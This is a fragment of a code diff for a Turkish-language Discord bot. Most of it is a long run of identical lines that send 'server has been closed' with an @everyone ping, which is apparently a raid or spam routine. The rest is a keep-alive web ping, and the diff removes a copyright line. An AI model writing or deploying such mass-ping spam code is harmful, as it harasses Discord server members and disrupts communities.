+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+        msg.channel.send('**__SUNUCU KAPATILMIŞTIR__** @everyone'); 
+
+       
   }
 });
 
@@ -1588,7 +7163,7 @@ const app = express();
   }    
 }
 app.get("/", (request, response) => {
-  console.log(Date.now() + " Ping tamamdır.");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+  console.log(Date.now() + " Ping tamamdır.");  
   response.sendStatus(200);
 });
 app.listen(process.env.PORT);
@@ -1597,4 +7172,4 @@ setInterval(() => {
 }, 3000);
 
 
-//TÜM TELİF HAKKI ENES ACARA AİTTİR ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=tw25SvdgeTk
+
